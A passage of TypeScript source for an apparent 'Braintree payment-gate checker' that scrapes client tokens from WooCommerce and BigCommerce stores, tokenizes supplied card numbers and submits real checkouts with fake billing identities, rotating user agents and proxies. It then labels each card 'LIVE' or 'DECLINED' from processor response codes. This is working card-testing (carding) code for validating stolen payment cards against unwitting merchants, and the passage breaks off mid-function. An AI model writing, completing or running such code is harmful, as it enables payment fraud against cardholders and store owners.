/**
 * Braintree payment-gate checker.
 *
 * Reconstructed from reference implementations:
 *   - braintree_gate.py  (WC add-payment-method + Spree/BigCommerce flows)
 *   - Braintree Auth.py  (WC braintree_cc plugin with braintree_cc_config_data)
 *   - A2.py              (BigCommerce Braintree flow)
 *
 * Key upgrades vs. previous version:
 *   - Fresh client-token extracted from site page on every check (WC flow)
 *   - braintree_cc_config_data field now included in WC form submission
 *   - Full BT processor response-code table (2000-2092, 81706-81725)
 *   - Live-signal, 3DS-signal, and hard-decline maps from reference
 *   - Dual Braintree API version pool (2018-05-10 / 2024-08-01)
 *   - Extended client-token extraction patterns
 */
import crypto from "crypto";
import {
  pick,
  pickBilling,
  extractBetween,
  sessionFetch,
  getProxy,
  getProxyDispatcher,
  dbg,
  detectBrandFromBin,
  parseCookies,
  mergeCookies,
  type CheckResult,
  type SessionState,
} from "./stripe-checker";
import { generateRandom } from "./ua-generator";

// ─── BraintreeExtras ─────────────────────────────────────────────────────────
export interface BraintreeExtras {
  /**
   * Which checkout flow to use:
   *   ""                   – auto (try addpm, fall back to wc checkout, then token-only)
   *   "wc_braintree_addpm" – WC /my-account/add-payment-method/ vault flow (default WC)
   *   "wc_braintree"       – WC standard checkout with Braintree as payment method
   *   "bigcommerce_stencil"– BigCommerce Stencil (future / manual token-only for now)
   */
  btFlow?: string;
  /** Fallback merchant ID when the decoded token doesn't include one */
  btMerchantId?: string;
  /** Override path for WC add-payment-method page (default: /my-account/add-payment-method/) */
  addPmPath?: string;
}

// ─── BT API version pool ─────────────────────────────────────────────────────
const BT_VERSIONS = ["2018-05-10", "2024-08-01"];

// ─── BT Processor Response-Code Table ────────────────────────────────────────
// Source: braintree_gate.py _BT_RESPONSE_CODES
const BT_RESPONSE_CODES: Record<string, ["live" | "dead", string]> = {
  "2000": ["dead", "Do Not Honor"],
  "2001": ["live", "Insufficient Funds"],
  "2002": ["live", "Limit Exceeded"],
  "2003": ["live", "Activity Limit"],
  "2004": ["dead", "Expired Card"],
  "2005": ["dead", "Invalid Card Number"],
  "2006": ["dead", "Invalid Expiry"],
  "2007": ["dead", "No Account"],
  "2008": ["dead", "Card Account Length Error"],
  "2009": ["dead", "No Such Issuer"],
  "2010": ["live", "CVV Mismatch"],
  "2011": ["dead", "Voice Authorization Required"],
  "2012": ["dead", "Processor Declined - Hold"],
  "2013": ["dead", "Processor Declined"],
  "2014": ["dead", "Processor Declined"],
  "2015": ["dead", "Transaction Not Allowed"],
  "2016": ["dead", "Duplicate Transaction"],
  "2017": ["dead", "Cardholder Cancelled Recurring"],
  "2018": ["dead", "Cardholder Cancelled All Recurring"],
  "2019": ["dead", "Invalid Transaction"],
  "2020": ["dead", "Violation"],
  "2021": ["dead", "Security Violation"],
  "2022": ["dead", "Declined - Updated Info Available"],
  "2023": ["dead", "Transaction Not Supported"],
  "2024": ["dead", "Card Type Not Enabled"],
  "2025": ["dead", "Set Up Error - Merchant"],
  "2026": ["dead", "Currency Not Supported"],
  "2027": ["dead", "Set Up Error - Amount"],
  "2028": ["dead", "Set Up Error - Hierarchy"],
  "2029": ["dead", "Set Up Error - Card"],
  "2030": ["dead", "Set Up Error - Terminal"],
  "2031": ["dead", "Encryption Error"],
  "2032": ["dead", "Surcharge Not Permitted"],
  "2033": ["dead", "Inconsistent Data"],
  "2034": ["dead", "No Action Taken"],
  "2035": ["dead", "Partial Approval"],
  "2036": ["dead", "Processor Declined - Auth Error"],
  "2037": ["dead", "Already Reversed"],
  "2038": ["dead", "Processor Declined"],
  "2039": ["dead", "Invalid Auth Code"],
  "2040": ["dead", "Invalid Store"],
  "2041": ["dead", "Declined - Call For Approval"],
  "2042": ["dead", "Invalid Client ID"],
  "2043": ["dead", "Error - Do Not Retry"],
  "2044": ["dead", "Declined - Call Issuer"],
  "2045": ["dead", "Invalid Merchant Number"],
  "2046": ["dead", "Declined"],
  "2047": ["dead", "Call Issuer"],
  "2048": ["dead", "Invalid Amount"],
  "2049": ["dead", "Invalid SKU Number"],
  "2050": ["dead", "Invalid Credit Plan"],
  "2051": ["dead", "Credit Card Number Invalid"],
  "2053": ["dead", "Card Reported Stolen"],
  "2054": ["dead", "Card Reported Lost"],
  "2055": ["dead", "Invalid PIN"],
  "2056": ["dead", "No Card Record"],
  "2057": ["dead", "Issuer/Cardholder Declined"],
  "2058": ["dead", "Transaction Not Permitted"],
  "2059": ["dead", "Suspected Fraud"],
  "2060": ["dead", "Security Violation"],
  "2061": ["live", "AVS Mismatch"],
  "2062": ["dead", "Invalid Branch"],
  "2063": ["dead", "Invalid Account Type"],
  "2064": ["dead", "Negative Info on File"],
  "2065": ["dead", "Withdrawal Limit Exceeded"],
  "2066": ["dead", "Issuer or Cardholder Restriction"],
  "2067": ["dead", "Hard Decline - No Retry"],
  "2068": ["dead", "Amount Exceeds Limit"],
  "2069": ["live", "PayPal Pending"],
  "2079": ["live", "PayPal Needs Consent"],
  "2090": ["live",  "AVS Address Required"],
  "2091": ["live",  "Voice Authorization Required"],
  "2092": ["dead",  "Destination Bank Cannot Process"],
  "81706": ["dead", "Invalid CVV"],
  "81707": ["dead", "CVV Required"],
  "81709": ["dead", "Invalid Expiry Month"],
  "81710": ["dead", "Invalid Expiry Year"],
  "81714": ["dead", "Card Already Expired"],
  "81725": ["dead", "Invalid Card Number"],
};

// ─── Live-signal keywords ─────────────────────────────────────────────────────
const BT_LIVE_SIGNALS = [
  "card issuer declined cvv", "cvv2", "cvv verification",
  "incorrect cid", "security code verification", "cvc check failed",
  "avs mismatch", "address verification", "postal code check failed",
  "insufficient funds", "insufficient_funds",
  "card_velocity_exceeded", "activity limit",
  "withdrawal_count_limit_exceeded", "limit exceeded",
  "approve_with_id", "approved with id",
];

// ─── 3DS signals ──────────────────────────────────────────────────────────────
const BT_3DS_SIGNALS = [
  "3d secure", "3ds", "authentication required", "challenge_required",
  "enrolled for verification", "sca_required", "three_d_secure_required",
];

// ─── Hard-decline map ─────────────────────────────────────────────────────────
const BT_HARD_DECLINES: [string, string][] = [
  ["do not honor", "Do Not Honor"],
  ["do_not_honor", "Do Not Honor"],
  ["expired card", "Expired Card"],
  ["expired_card", "Expired Card"],
  ["lost card", "Card Reported Lost"],
  ["lost_card", "Card Reported Lost"],
  ["stolen card", "Card Reported Stolen"],
  ["stolen_card", "Card Reported Stolen"],
  ["pick up card", "Pick Up Card"],
  ["pickup_card", "Pick Up Card"],
  ["restricted card", "Restricted Card"],
  ["restricted_card", "Restricted Card"],
  ["your card was declined", "Card Declined"],
  ["card is not accepted", "Card Not Accepted"],
  ["processor declined", "Processor Declined"],
  ["invalid card number", "Invalid Card Number"],
  ["incorrect_number", "Invalid Card Number"],
  ["transaction not allowed", "Transaction Not Allowed"],
  ["transaction_not_allowed", "Transaction Not Allowed"],
  ["not_permitted", "Transaction Not Permitted"],
  ["card not activated", "Card Not Activated"],
  ["invalid expiration", "Invalid Expiry"],
  ["invalid_expiry", "Invalid Expiry"],
  ["no such issuer", "No Such Issuer"],
  ["suspected fraud", "Suspected Fraud"],
  ["fraudulent", "Fraud Suspected"],
  ["security violation", "Security Violation"],
  ["security_violation", "Security Violation"],
  ["generic_decline", "Card Declined"],
  ["card_declined", "Card Declined"],
  ["gateway rejected: risk_threshold", "Gateway Risk Rejected"],
  ["gateway rejected: risk", "Gateway Risk Rejected"],
  ["gateway rejected: avs", "Gateway AVS Rejected"],
  ["gateway rejected: cvv", "Gateway CVV Rejected"],
  ["gateway rejected: duplicate", "Gateway Duplicate Rejected"],
  ["gateway rejected: fraud", "Gateway Fraud Rejected"],
  ["gateway_rejected", "Gateway Rejected"],
  ["call_issuer", "Call Issuer"],
  ["issuer_not_available", "Call Issuer"],
  ["reenter_transaction", "Processor Declined"],
  ["no_action_taken", "Card Declined"],
  ["incorrect_zip", "Declined - AVS"],
];

// ─── Bad-token guard ─────────────────────────────────────────────────────────
/**
 * Returns true when `raw` looks like a stored error message rather than a real
 * Braintree base64 client token.  Sites occasionally expose the raw API error
 * (e.g. "API Authorization check failed") in the token field.
 */
function isBadBtToken(raw: string): boolean {
  if (!raw || raw.length < 20) return true;
  // Error phrases found in real-world bad tokens
  const errorPhrases = [
    "api authorization", "authorization failed", "authorization check failed",
    "invalid token", "error", "failed", "denied", "not found", "unauthorized",
    "access denied", "forbidden", "internal server",
  ];
  const lower = raw.toLowerCase();
  if (errorPhrases.some(p => lower.includes(p))) return true;
  // Valid BT base64 tokens contain only [A-Za-z0-9+/=] — spaces/brackets flag an error
  if (/[\s<>{}[\]()]/.test(raw)) return true;
  return false;
}

// ─── BT client-token extractor (multiple page patterns) ──────────────────────
function extractBtClientToken(html: string): string | null {
  const patterns = [
    /var\s+wc_braintree_client_token\s*=\s*\["([^"]+)"/,         // WC inline script: var wc_braintree_client_token = ["token"]
    /braintreeClientToken\s*["':]+"([^"']+)"/,                   // JSON / JS colon-style
    /braintreeClientToken\s*=\s*["']([^"']+)["']/,               // JS assignment: braintreeClientToken = "token"
    /braintree_client_token\s*["':]+"([^"']+)"/,                 // underscored, colon-style
    /braintree_client_token\s*=\s*["']([^"']+)["']/,             // underscored, assignment-style
    /"clientToken"\s*:\s*"([^"]+)"/,
    /"client_token"\s*:\s*"([^"]+)"/,
    /"braintree_token"\s*:\s*"([^"]+)"/,
    /data-braintree-token="([^"]+)"/,
    /braintree_client_token'\s*:\s*'([^']+)'/,
    /"payment_client_token"\s*:\s*"([^"]+)"/,
    /"bt_client_token"\s*:\s*"([^"]+)"/,
    /clientToken\s*=\s*["']([^"']+)["']/,
    /"data-client-token"\s*:\s*"([^"]+)"/,
  ];
  for (const pat of patterns) {
    const m = html.match(pat);
    if (m?.[1] && m[1].length > 20) {
      return m[1]
        .replace(/\\u003d/g, "=")
        .replace(/\\\//g, "/")
        .replace(/\\n/g, "");
    }
  }
  return null;
}

// ─── Decode BT token → authFingerprint + merchantId ──────────────────────────
// Heavy lifting lives in bt-token.ts so it can be unit-tested without dragging
// the storage/DB import chain in.
import { decodeBtTokenStrict } from "./bt-token";
export { decodeBtTokenStrict };

/** Back-compat wrapper — old call sites get back the same shape (or null). */
function decodeBtToken(raw: string): { authFingerprint: string; merchantId: string } | null {
  const r = decodeBtTokenStrict(raw);
  return r.ok ? { authFingerprint: r.authFingerprint, merchantId: r.merchantId } : null;
}

// ─── Extract primary errors from BT JSON response ────────────────────────────
function extractBtErrors(resText: string, js: any): string[] {
  const parts: string[] = [];
  for (const m of resText.matchAll(/"base"\s*:\s*\["([^"]+)"/g)) {
    if (!parts.includes(m[1])) parts.push(m[1]);
  }
  if (typeof js?.error === "string" && js.error) parts.push(js.error);
  else if (typeof js?.error?.message === "string") parts.push(js.error.message);
  const errors = js?.errors;
  if (errors && typeof errors === "object" && !Array.isArray(errors)) {
    for (const val of Object.values(errors)) {
      if (Array.isArray(val)) {
        for (const v of val) { if (typeof v === "string" && !parts.includes(v)) parts.push(v); }
      } else if (typeof val === "string" && !parts.includes(val)) {
        parts.push(val as string);
      }
    }
  } else if (Array.isArray(errors)) {
    for (const e of errors) { if (typeof e === "string" && !parts.includes(e)) parts.push(e); }
  }
  return parts;
}

// ─── Classify WC add-payment-method HTML response ────────────────────────────
function classifyBtHtml(
  html: string,
  gateName: string,
  network: string,
  cardType: string,
  countryCode: string,
  issuer: string,
  fullCardInfo: string,
  latency: number
): CheckResult {
  const text = html.toLowerCase();

  const live = (msg: string): CheckResult => ({
    status: "live",
    response: `CCN LIVE ⚡ ${msg} | ${network} ${cardType} [${countryCode}] | ${issuer}`,
    code: "bt_ccn_live",
    latency,
    gate: gateName,
    cardInfo: fullCardInfo,
  });
  const dead = (msg: string): CheckResult => ({
    status: "dead",
    response: `DECLINED ✗ ${msg} | ${network} [${countryCode}]`,
    code: "bt_declined",
    latency,
    gate: gateName,
    cardInfo: fullCardInfo,
  });

  // Successful add
  if (
    text.includes("payment method successfully added") ||
    text.includes("nice! new payment method added")
  ) {
    return {
      status: "live",
      response: `CVV LIVE ✓ BT Approved | ${network} ${cardType} [${countryCode}] | ${issuer}`,
      code: "bt_approved",
      latency,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  }

  // Duplicate in vault = card is real
  if (text.includes("duplicate card exists in the vault")) {
    return live("Duplicate Card in Vault");
  }

  // risk_threshold = card is real (live)
  if (text.includes("risk_threshold")) {
    return live("Risk Threshold");
  }

  // Extract "Reason: …" from WC error HTML
  const reasonMatch = html.match(/Reason:\s*(.+?)(?:<\/li>|<\/p>|<\/div>|<br|\n|$)/i);
  const reason = reasonMatch
    ? reasonMatch[1].replace(/<[^>]+>/g, "").trim()
    : "";

  if (reason) {
    const rLow = reason.toLowerCase();

    // Check BT processor code in reason string
    const codeM = reason.match(/(\d{4,5})/);
    if (codeM && BT_RESPONSE_CODES[codeM[1]]) {
      const [st, detail] = BT_RESPONSE_CODES[codeM[1]];
      return st === "live" ? live(`${detail} | ${reason}`) : dead(`${detail} | ${reason}`);
    }

    // 1000 = approved
    if (reason.includes("1000") || rLow.includes("approved")) {
      return {
        status: "live",
        response: `CVV LIVE ✓ ${reason} | ${network} ${cardType} [${countryCode}] | ${issuer}`,
        code: "bt_approved",
        latency,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    const liveKws = ["avs", "insufficient funds", "invalid postal code",
                     "invalid street address", "duplicate", "invalid billing address", "cvv"];
    for (const kw of liveKws) {
      if (rLow.includes(kw)) {
        return kw === "cvv"
          ? { ...live(`CVV Wrong | ${reason}`), code: "bt_ccn_cvv_wrong" }
          : live(reason.substring(0, 80));
      }
    }

    return dead(reason.substring(0, 80));
  }

  // 3DS signals
  for (const sig of BT_3DS_SIGNALS) {
    if (text.includes(sig)) {
      return {
        status: "live",
        response: `CCN LIVE ⚡ 3DS Required | ${network} ${cardType} [${countryCode}] | ${issuer}`,
        code: "bt_3ds_required",
        latency,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }
  }

  // Hard-decline patterns
  for (const [pattern, label] of BT_HARD_DECLINES) {
    if (text.includes(pattern)) {
      const isLive = pattern.includes("avs") || pattern.includes("insufficient") ||
                     pattern.includes("cvv") || pattern.includes("duplicate");
      return isLive ? live(label) : dead(label);
    }
  }

  // Generic live signals
  for (const sig of BT_LIVE_SIGNALS) {
    if (text.includes(sig)) return live(sig);
  }

  // WC error list item
  const liM = html.match(/<li[^>]*>(.*?)<\/li>/is);
  if (liM) {
    const err = liM[1].replace(/<[^>]+>/g, "").trim();
    if (err) return dead(err.substring(0, 80));
  }

  return {
    status: "dead",
    response: `DECLINED ✗ Unknown BT Response | ${network} [${countryCode}]`,
    code: "bt_unknown",
    latency,
    gate: gateName,
    cardInfo: fullCardInfo,
  };
}

// ─── Classify standard BT checkout JSON response ─────────────────────────────
function classifyBtJson(
  resText: string,
  gateName: string,
  network: string,
  cardType: string,
  countryCode: string,
  issuer: string,
  fullCardInfo: string,
  latency: number
): CheckResult {
  const resLower = resText.toLowerCase();
  let js: any = {};
  try { js = JSON.parse(resText); } catch { /* not JSON */ }

  const live = (msg: string): CheckResult => ({
    status: "live",
    response: `CCN LIVE ⚡ ${msg} | ${network} ${cardType} [${countryCode}] | ${issuer}`,
    code: "bt_ccn_live",
    latency,
    gate: gateName,
    cardInfo: fullCardInfo,
  });
  const dead = (msg: string): CheckResult => ({
    status: "dead",
    response: `DECLINED ✗ ${msg} | ${network} [${countryCode}]`,
    code: "bt_declined",
    latency,
    gate: gateName,
    cardInfo: fullCardInfo,
  });

  // Order-state shortcuts
  const orderState = String(js?.order?.state || js?.state || "");
  const paymentState = String(js?.order?.payment_state || "");
  const currentStep = String(js?.currentStep || "");
  if (orderState === "complete" || paymentState === "paid") {
    return {
      status: "live",
      response: `CVV LIVE ✓ BT Approved - Payment Processed | ${network} ${cardType} [${countryCode}] | ${issuer}`,
      code: "bt_approved",
      latency,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  }
  if (orderState === "confirm" || currentStep === "confirmation") {
    return {
      status: "live",
      response: `CVV LIVE ✓ BT Approved - Confirmation | ${network} ${cardType} [${countryCode}] | ${issuer}`,
      code: "bt_approved",
      latency,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  }

  // Processor response code
  const codeM = resText.match(/"(?:processorResponseCode|code)"\s*:\s*"?(\d{4,5})"?/);
  if (codeM && BT_RESPONSE_CODES[codeM[1]]) {
    const [st, detail] = BT_RESPONSE_CODES[codeM[1]];
    return st === "live" ? live(detail) : dead(detail);
  }

  // 3DS
  for (const sig of BT_3DS_SIGNALS) {
    if (resLower.includes(sig)) return live("3DS Required");
  }

  // Live signals
  for (const sig of BT_LIVE_SIGNALS) {
    if (resLower.includes(sig)) return live(sig);
  }

  // Hard declines
  for (const [pattern, label] of BT_HARD_DECLINES) {
    if (resLower.includes(pattern)) {
      // Consistent with classifyBtHtml: avs/cvv/insufficient_funds/duplicate = live
      const isLive = pattern.includes("avs") || pattern.includes("insufficient") ||
                     pattern.includes("cvv") || pattern.includes("duplicate");
      return isLive ? live(label) : dead(label);
    }
  }

  // JSON error fields
  const errors = extractBtErrors(resText, js);
  if (errors.length > 0) {
    const clean = errors[0].replace(/<[^>]+>/g, "").trim().substring(0, 80);
    if (clean) return dead(clean);
  }

  return dead("BT Card Declined");
}

// ─── GraphQL tokenize call ────────────────────────────────────────────────────
async function tokenizeAtBraintree(
  cardNumber: string,
  month: string,
  year: string,
  cvv: string,
  authFingerprint: string,
  ua: string,
  secChUa: string,
  billing?: { zip: string; line1?: string }
): Promise<{
  ok: boolean;
  token?: string;
  brandCode?: string;
  issuingBank?: string;
  countryOfIssuance?: string;
  prepaid?: string;
  debit?: string;
  error?: string;
}> {
  const btVersion = BT_VERSIONS[Math.floor(Math.random() * BT_VERSIONS.length)];
  const sessionId = crypto.randomUUID();

  const cardInput: any = {
    number: cardNumber.trim(),
    expirationMonth: month,
    expirationYear: year,
    cvv: cvv.trim(),
  };
  if (billing) {
    cardInput.billingAddress = {
      postalCode: billing.zip,
      streetAddress: billing.line1 || `${Math.floor(Math.random() * 9000) + 100} Main St`,
    };
  }

  const body = {
    clientSdkMetadata: { source: "client", integration: "dropin2", sessionId },
    query:
      "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {" +
      " tokenizeCreditCard(input: $input) {" +
      " token creditCard { bin brandCode last4" +
      " binData { prepaid healthcare debit durbinRegulated commercial payroll" +
      " issuingBank countryOfIssuance productId } } } }",
    variables: {
      input: { creditCard: cardInput, options: { validate: false } },
    },
    operationName: "TokenizeCreditCard",
  };

  try {
    const resp = await fetch("https://payments.braintree-api.com/graphql", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${authFingerprint}`,
        "Braintree-Version": btVersion,
        Origin: "https://assets.braintreegateway.com",
        Referer: "https://assets.braintreegateway.com/",
        "User-Agent": ua,
        "sec-ch-ua": secChUa,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
      },
      body: JSON.stringify(body),
      signal: AbortSignal.timeout(20000),
    });

    if (!resp.ok) return { ok: false, error: `BT GQL HTTP ${resp.status}` };

    const data = await resp.json();
    if (data.errors?.length > 0) {
      return { ok: false, error: data.errors[0].message || "Tokenize error" };
    }

    const tc = data.data?.tokenizeCreditCard;
    if (!tc?.token) return { ok: false, error: "No token in response" };

    const cc = tc.creditCard || {};
    const bd = cc.binData || {};
    return {
      ok: true,
      token: tc.token,
      brandCode: cc.brandCode || "",
      issuingBank: bd.issuingBank || "Unknown",
      countryOfIssuance: bd.countryOfIssuance || "??",
      prepaid: bd.prepaid || "No",
      debit: bd.debit || "No",
    };
  } catch (e: any) {
    return { ok: false, error: e.message };
  }
}

// ─── WooCommerce Braintree standard-checkout flow ────────────────────────────
/**
 * Performs a real WC checkout using Braintree Credit Card as the payment method.
 * Used when a site has the wc_braintree plugin but not the add-payment-method vault.
 *
 * Flow:
 *   1. GET /checkout/ → extract woocommerce-process-checkout-nonce + client_token_nonce
 *   2. Try inline BT token in page; if missing → POST admin-ajax to get fresh token
 *   3. Find a product via Store API products endpoint
 *   4. Add it to cart via classic WC /?add-to-cart=ID
 *   5. Tokenize at BT GraphQL
 *   6. POST /checkout/ with Braintree nonce + billing fields
 *
 * Returns null on any critical failure so the caller can fall back.
 */
async function checkWcBraintreeCheckoutFlow(
  cardNumber: string,
  month: string,
  year: string,
  cvv: string,
  cleanSite: string,
  initialAuthFingerprint: string,
  initialMerchantId: string,
  state: SessionState,
  ua: string,
  secChUa: string,
  gateName: string,
  fullCardInfo: string,
  start: number,
): Promise<CheckResult | null> {
  try {
    // 1. GET checkout page — extract WC checkout nonce + client_token_nonce
    const ckPageResp = await sessionFetch(`${cleanSite}/checkout/`, state, {
      timeout: 15000, maxRetries: 0,
    });
    state = ckPageResp.state;
    const ckHtml = ckPageResp.text;

    const wcNonceM = ckHtml.match(/name="woocommerce-process-checkout-nonce"\s*value="([^"]+)"/);
    const wcCheckoutNonce = wcNonceM?.[1];
    if (!wcCheckoutNonce) {
      dbg("[bt-wc-checkout] No WC checkout nonce on /checkout/ — guest checkout may be disabled");
      return null;
    }

    // 2. Prefer inline BT token from checkout page; otherwise call admin-ajax
    let authFingerprint = initialAuthFingerprint;
    let merchantId = initialMerchantId;

    const inlineToken = extractBtClientToken(ckHtml);
    if (inlineToken && !isBadBtToken(inlineToken)) {
      const fresh = decodeBtToken(inlineToken);
      if (fresh) {
        ({ authFingerprint, merchantId } = fresh);
        dbg("[bt-wc-checkout] Fresh BT token from inline checkout page HTML");
      }
    }

    if (authFingerprint === initialAuthFingerprint) {
      // Try AJAX endpoint exposed by wc_braintree plugin
      const ctNonceM = ckHtml.match(/"client_token_nonce"\s*:\s*"([^"]+)"/);
      if (ctNonceM) {
        try {
          const ajaxResp = await sessionFetch(`${cleanSite}/wp-admin/admin-ajax.php`, state, {
            method: "POST",
            body: new URLSearchParams({
              action: "wc_braintree_credit_card_get_client_token",
              nonce: ctNonceM[1],
            }).toString(),
            contentType: "application/x-www-form-urlencoded",
            xRequestedWith: true,
            timeout: 12000,
            maxRetries: 0,
          });
          state = ajaxResp.state;
          try {
            const ajaxJs = JSON.parse(ajaxResp.text);
            const tokenData: string = ajaxJs?.data || "";
            if (tokenData && !isBadBtToken(tokenData)) {
              const fresh = decodeBtToken(tokenData);
              if (fresh) {
                ({ authFingerprint, merchantId } = fresh);
                dbg("[bt-wc-checkout] Fresh BT token via admin-ajax");
              }
            }
          } catch {}
        } catch (ajaxErr: any) {
          dbg(`[bt-wc-checkout] admin-ajax token fetch: ${ajaxErr.message}`);
        }
      }
    }

    // 3. Find a product to add to cart (prefer simple, in-stock)
    let productId: number | null = null;
    try {
      const prodResp = await fetch(`${cleanSite}/wp-json/wc/store/v1/products?per_page=8`, {
        headers: {
          "User-Agent": ua,
          Accept: "application/json",
          ...(state.cookies ? { Cookie: state.cookies } : {}),
        },
        signal: AbortSignal.timeout(8000),
      });
      if (prodResp.ok) {
        const products: any[] = await prodResp.json();
        const simple = products.find(p => p.type === "simple");
        productId = simple?.id ?? products[0]?.id ?? null;
      }
    } catch {}

    if (!productId) {
      dbg("[bt-wc-checkout] No product found via Store API — cannot add to cart");
      return null;
    }

    // 4. Add to cart via classic WC GET redirect
    const addCartResp = await sessionFetch(
      `${cleanSite}/?add-to-cart=${productId}&quantity=1`,
      state,
      { timeout: 10000, maxRetries: 0 },
    );
    state = addCartResp.state;
    dbg(`[bt-wc-checkout] Cart add → status=${addCartResp.status}`);

    // 5. Tokenize at BT GraphQL
    const tok = await tokenizeAtBraintree(cardNumber, month, year, cvv, authFingerprint, ua, secChUa);
    if (!tok.ok || !tok.token) {
      dbg(`[bt-wc-checkout] Tokenize failed: ${tok.error}`);
      return null;
    }

    const network   = (tok.brandCode || detectBrandFromBin(cardNumber)).toUpperCase();
    const issuer    = tok.issuingBank || "Unknown";
    const countryCode = tok.countryOfIssuance || "??";
    const cardType  = tok.prepaid === "Yes" ? "PREPAID" : tok.debit === "Yes" ? "DEBIT" : "CREDIT";

    // 6. POST checkout form with BT nonce
    const deviceData = JSON.stringify({
      device_session_id: crypto.randomUUID().replace(/-/g, ""),
      fraud_merchant_id: null,
      correlation_id: crypto.randomUUID(),
    });

    // Random billing data from the pool
    const bd = await pickBilling(cardNumber);
    const btNames = [
      ["James","Smith"],["Mary","Johnson"],["John","Williams"],
      ["Emma","Brown"],["Robert","Jones"],["Sarah","Miller"],
    ];
    const [bFirst, bLast] = btNames[Math.floor(Math.random() * btNames.length)];

    const checkoutForm = new URLSearchParams({
      // Both nonce key names (SkyVerge + Kestrel plugins)
      payment_method:                              "braintree_credit_card",
      wc_braintree_credit_card_payment_nonce:      tok.token,
      braintree_cc_nonce_key:                      tok.token,
      wc_braintree_credit_card_device_data:        deviceData,
      braintree_cc_device_data:                    deviceData,
      billing_first_name:                          bFirst,
      billing_last_name:                           bLast,
      billing_email:                               `order${Date.now()}@gmail.com`,
      billing_phone:                               "555-000-0000",
      billing_address_1:                           bd.line1 || "123 Main St",
      billing_city:                                bd.city  || "New York",
      billing_state:                               bd.stateCode || "NY",
      billing_postcode:                            bd.zip   || "10001",
      billing_country:                             bd.country || "US",
      billing_company:                             "",
      billing_address_2:                           "",
      order_comments:                              "",
      "woocommerce-process-checkout-nonce":        wcCheckoutNonce,
      _wp_http_referer:                            "/checkout/",
      terms:                                       "on",
      "terms-field":                               "1",
    });

    const submitResp = await sessionFetch(`${cleanSite}/checkout/`, state, {
      method: "POST",
      body: checkoutForm.toString(),
      contentType: "application/x-www-form-urlencoded",
      referer: `${cleanSite}/checkout/`,
      origin: cleanSite,
      timeout: 30000,
    });
    dbg(`[bt-wc-checkout] Checkout submit → status=${submitResp.status}, len=${submitResp.text.length}`);

    return classifyBtHtml(
      submitResp.text, gateName,
      network, cardType, countryCode, issuer,
      fullCardInfo, Date.now() - start,
    );
  } catch (err: any) {
    dbg(`[bt-wc-checkout] Flow error: ${err.message}`);
    return null;
  }
}

// ─── BigCommerce Stencil + Braintree flow ────────────────────────────────────
/**
 * BigCommerce Stencil storefront flow:
 *   1. GET site → CSRF token + XSRF-TOKEN cookie
 *   2. POST /remote/v1/cart/add → adds a product to cart
 *   3. GET /checkout → checkoutId + braintreeClientToken
 *   4. POST billing-address via BC Storefront API
 *   5. POST consignment (best-effort shipping selection)
 *   6. POST /internalapi/v1/checkout/order → X-Checkout-Payment-Token (JWT)
 *   7. Tokenize card at BT GraphQL → nonce
 *   8. POST payments.bigcommerce.com/api/public/v1/orders/payments
 *
 * Returns null on any critical extraction failure so the caller can fall
 * back to the token-only path.
 */
async function checkBigCommerceStencilFlow(
  cardNumber: string,
  month: string,
  year: string,
  cvv: string,
  cleanSite: string,
  state: SessionState,
  ua: string,
  secChUa: string,
  gateName: string,
  fullCardInfo: string,
  start: number,
): Promise<CheckResult | null> {
  try {
    // 1. Home page → CSRF token + XSRF cookie
    const homeResp = await sessionFetch(cleanSite, state, { timeout: 15000, maxRetries: 0 });
    state = homeResp.state;
    const csrfM = homeResp.text.match(/name="csrf-token"\s+content="([^"]+)"/);
    const sfCsrf = csrfM?.[1];
    const xsrfM = state.cookies.match(/XSRF-TOKEN=([^;]+)/);
    const xXsrf = xsrfM ? decodeURIComponent(xsrfM[1]) : "";
    if (!sfCsrf) {
      dbg("[bc-stencil] No CSRF token found on home page");
      return null;
    }

    // 2. Find a purchasable product on the home page
    const prodM = homeResp.text.match(/data-product-id="(\d+)"/) || homeResp.text.match(/"entityId":(\d+)/);
    const productId = prodM ? parseInt(prodM[1], 10) : null;
    if (!productId) {
      dbg("[bc-stencil] No product id found on home page");
      return null;
    }

    const bcHeaders = { "x-sf-csrf-token": sfCsrf, ...(xXsrf ? { "x-xsrf-token": xXsrf } : {}) };

    // 3. Add to cart
    const cartAddBody = new URLSearchParams({ action: "add", product_id: String(productId), "qty[]": "1" });
    const cartResp = await sessionFetch(`${cleanSite}/remote/v1/cart/add`, state, {
      method: "POST",
      body: cartAddBody.toString(),
      contentType: "application/x-www-form-urlencoded",
      referer: cleanSite,
      origin: cleanSite,
      xRequestedWith: true,
      extraHeaders: bcHeaders,
      timeout: 15000,
      maxRetries: 0,
    });
    state = cartResp.state;
    if (!cartResp.ok) {
      dbg(`[bc-stencil] cart/add failed status=${cartResp.status}`);
      return null;
    }

    // 4. Checkout page → checkoutId + BT client token
    const ckResp = await sessionFetch(`${cleanSite}/checkout`, state, { timeout: 15000, maxRetries: 0 });
    state = ckResp.state;
    const checkoutIdM = ckResp.text.match(/checkoutId["':]+\s*["']([0-9a-fA-F-]{36})["']/)
      || ckResp.text.match(/"checkoutId":"([0-9a-fA-F-]{36})"/);
    const checkoutId = checkoutIdM?.[1];
    const btTokenM = ckResp.text.match(/braintreeClientToken["':]+\s*["']([^"']+)["']/)
      || ckResp.text.match(/"clientToken":"([^"]+)"/);
    const rawBtToken = btTokenM?.[1];
    if (!checkoutId || !rawBtToken) {
      dbg("[bc-stencil] Missing checkoutId or braintreeClientToken on checkout page");
      return null;
    }

    const decoded = decodeBtToken(rawBtToken.replace(/\\u002[Ff]/g, "/").replace(/\\\//g, "/"));
    if (!decoded) {
      dbg("[bc-stencil] Failed to decode BT client token");
      return null;
    }
    const { authFingerprint } = decoded;

    // 5. Billing address via BC Storefront API
    const bd = await pickBilling(cardNumber);
    const address = {
      firstName: "John",
      lastName: "Smith",
      address1: bd.line1 || "123 Main St",
      city: bd.city || "New York",
      stateOrProvince: bd.stateCode || "NY",
      postalCode: bd.zip || "10001",
      countryCode: bd.country || "US",
      email: `order${Date.now()}@gmail.com`,
      phone: "5550000000",
    };
    const billResp = await sessionFetch(
      `${cleanSite}/api/storefront/checkouts/${checkoutId}/billing-address`,
      state,
      {
        method: "POST",
